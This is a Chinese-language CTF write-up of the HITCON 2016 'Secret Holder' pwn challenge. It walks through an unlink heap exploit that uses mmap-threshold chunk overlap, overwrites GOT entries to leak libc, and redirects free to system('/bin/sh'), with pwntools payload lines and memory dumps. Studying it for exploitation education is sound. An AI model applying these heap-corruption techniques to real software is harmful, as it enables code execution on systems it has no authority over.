# Secret Holder
這題是比賽結束後照著 **bruce** 學長的想法解出來的，過程中除了複習了還不太熟悉的 unlink exploit 也新學到了幾個 heap 的特性，所以也寫一篇來記錄 XD。

## 觀察程式
首先看一下程式提供的幾項功能：
* `keepSecret`：分配 3 種不同大小的空間，並接受對應大小的輸入到該空間
* `wipeSecret`：`free` 掉某個大小的空間
* `renewSecret`：可以重新寫入某個大小的空間

以及程式中 global 段的幾個變數：
```
 0|-------------|
  |             |
  |   big_ptr   |  # point to allocated 40bytes
  |             |
 8|-------------|
  |             |
  |  huge_ptr   |  # point to allocated 4000bytes
  |             |
16|-------------| 
  |             |
  |  small_ptr  |  # point to allocated 400000bytes
  |             |
24|-------------|
  |   big_flag  |  # set to 1 when use keep big secret
28|-------------|
  |  huge_flag  |  # set to 1 when use keep huge secret
32|-------------|
  |  small_flag |  # set to 1 when use keep small secret
  |-------------|
```

## 解題流程

在開始之前要先知道一件事。動態申請的空間到一定的大小後，會使用 `mmap` 來分配，得到的空間將不會在 heap 上。不過當我們 `free` 掉這塊空間後再次分配相同大小的空間，會發現他改用 `malloc` 來分配了！我有試著觀察這個機制，可以參考 [mmap_test](https://github.com/briansp8210/CTF_writeup/blob/master/HITCONCTF_2016_qual/SecretHolder/mmap_test.md)。

於是我們可以利用這點讓 huge 和 small 兩塊 chunk 重疊，並讓 big 接在 small 後面。
接著就可以開始準備做 unlink 的準備，這裡我們打算在 small chunk 裡面造假 chunk，接著 `free` big chunk，目標是在 unlink 後 huge_ptr 會等於 `(&huge_ptr - 0x18)`。
可以透過 renew huge 來寫入要控的值：

```python
renew(3, 'E'*8 + p64(0x21) + p64(huge_ptr-0x18) + p64(huge_ptr-0x10) + p64(0x20) + p64(0xfb0))
```
<pre>
# 我們的目標，huge_ptr = 0x6020a8

small/huge chunk  -> 0x0000000000000000      0x0000000000000031
huge_ptr point to -> 0x4545454545454545      0x00000000000000<b>21</b>
                     0x0000000000<b>602090</b>      0x0000000000<b>602098</b>
       big chunk  -> 0x00000000000000<b>20</b>      0x0000000000000fb<b>0</b>
 big_ptr point to -> 0x434343434343430a      0x000000000000000a
                     0x0000000000000000      0x0000000000000000
                     0x0000000000000000      0x0000000000000000
</pre>

成功之後我們就可以去 renew huge 來把 huge_ptr 蓋成 `free@got.plt`，順便把位址更高的 small_ptr 蓋成 `__libc_start_main@got.plt`。

```python
renew(3, 'F'*24 + p64(free_got) + p64(libc_start_main_got))
```
<pre>
0x602090:              0x4646464646464646      0x4646464646464646
0x6020a0:              0x4646464646464646      0x0000000000<b>602018</b> <- huge_ptr
0x6020b0: small_ptr -> 0x0000000000<b>602048</b>      0x000000010000000a
0x6020c0:              0x0000000000000001      0x0000000000000000
</pre>

接著只要再 renew huge 送 `puts@plt` 進去，就可以將 `free` 蓋成 `puts` 了。
又因為我們剛才把 small_ptr 蓋成 `__libc_start_main@got.plt`，我們可以用 wipe small 來 leak 出 libc address，從而推出 libc base address。

接著，我們再一次用 renew huge 把 `system` 給送上去，這樣就把 `free` 蓋成 `system` 了。然後我們利用 keep small 把 `"/bin/sh"` 寫進 small_ptr。最後，用 wipe small 的時候就會從 `free(small_ptr)` 變成 `system("/bin/sh")`，順利取得 shell！

